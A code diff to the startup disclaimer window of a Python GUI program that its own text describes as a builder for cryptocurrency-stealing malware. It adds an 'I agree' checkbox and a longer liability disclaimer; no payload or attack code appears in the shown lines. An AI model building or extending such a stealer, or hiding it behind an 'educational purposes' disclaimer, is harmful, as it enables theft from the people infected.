@@ -22,6 +22,14 @@ customtkinter.set_appearance_mode("dark")
 cwd = os.getcwd()
 
 class toplevel:
+    def agree():
+        if agree_var.get() == "off":
+            close_btn.configure(state="disabled")
+            close_btn.update()
+        elif agree_var.get() == "on":
+            close_btn.configure(state="normal")
+            close_btn.update()
+
     def close():
         hPyT.opacity.set(root, 0.999)
         hPyT.minimize_button.enable(root)
@@ -34,10 +42,10 @@ class toplevel:
                 file.close()
 
     def top():
-        global top_level, dont_show_again_checkbox
+        global top_level, dont_show_again_checkbox, agree_var, close_btn
         
         top_level = customtkinter.CTkToplevel()
-        top_level.geometry("600x300")
+        top_level.geometry("600x335")
         top_level.resizable(height=False, width=False)
         top_level.attributes('-topmost', True)
         hPyT.title_bar.hide(top_level)
@@ -48,19 +56,25 @@ class toplevel:
         text_frame = customtkinter.CTkScrollableFrame(master=top_level)
         text_frame.pack(fill="both", padx=10, pady=(18, 10))
 
-        customtkinter.CTkLabel(master=text_frame, text="coded by https://github.com/3022-2/", font=("", 15, "bold")).pack()
+        customtkinter.CTkLabel(master=text_frame, text="coded by https://github.com/3022-2", font=("", 15, "bold")).pack()
         customtkinter.CTkLabel(master=text_frame, text="").pack()
-        customtkinter.CTkLabel(master=text_frame, text="DISCLAIMER: This program is intended for educational and malware analysis purposes only. Any use of this code for illegal or unethical activities is strictly prohibited. The author of this code shall not be held responsible for any misuse or damage resulting from its use. Users are solely responsible for ensuring compliance with applicable laws and ethical standards.", wraplength=500, font=("", 15, "bold")).pack()
+        customtkinter.CTkLabel(master=text_frame, text="DISCLAIMER: This program is intended for educational and malware analysis purposes only. Any use of this code for illegal or unethical activities is strictly prohibited. The author of this code shall not be held responsible for any misuse or damage resulting from its use. Users are solely responsible for ensuring compliance with applicable laws and ethical standards. By pressing I agree and continuing to use this program you agree that the author of this code shall not be held responsible for any misuse or damage resulting from its use.", wraplength=500, font=("", 15, "bold")).pack()
         customtkinter.CTkLabel(master=text_frame, text="").pack()
         customtkinter.CTkLabel(master=text_frame, text="WARNING: THIS IS A PROGRAM DESIGNED TO BUILD MALWARE. THE MALWARE IS FOR STEALING CRYPTOCURRENCY. USE UNINSTALL GUIDE IF uninstaller.py FAILS. (not found error doesn't necessarily mean didnt uninstall)", wraplength=500, font=("", 15, "bold")).pack()
         customtkinter.CTkLabel(master=text_frame, text="").pack()
         customtkinter.CTkLabel(master=text_frame, text="dont forget the follow the LICENSE if you wish to distribute copies of this program", wraplength=500, font=("", 15, "bold")).pack()
-        dont_show_again_checkbox = customtkinter.CTkCheckBox(master=top_level, text="dont show this again", onvalue="on", offvalue="off")
-        dont_show_again_checkbox.pack()
+        
+        agree_var = customtkinter.StringVar(value="off")
 
-        close_btn = customtkinter.CTkButton(master=top_level, text="close window", command=lambda: toplevel.close())
+        i_agree = customtkinter.CTkCheckBox(master=top_level, text="I agree", onvalue="on", offvalue="off", variable=agree_var, command=lambda: toplevel.agree())
+        i_agree.pack(anchor="w", padx=(237, 0), pady=(0, 10))
+        dont_show_again_checkbox = customtkinter.CTkCheckBox(master=top_level, text="dont show this again", onvalue="on", offvalue="off")
+        dont_show_again_checkbox.pack(anchor="w", padx=(237, 0))
+
+        close_btn = customtkinter.CTkButton(master=top_level, text="close window", command=lambda: toplevel.close(), state="disabled", width=500)
         close_btn.pack(pady=10)
-        exit = customtkinter.CTkButton(master=top_level, text="EXIT", fg_color="red", hover_color="#8B0000", font=("", 13, "bold"), command=lambda: sys.exit())
+
+        exit = customtkinter.CTkButton(master=top_level, text="EXIT", fg_color="red", hover_color="#8B0000", font=("", 13, "bold"), width=500, command=lambda: sys.exit())
         exit.pack()
 
 class resetconfig:
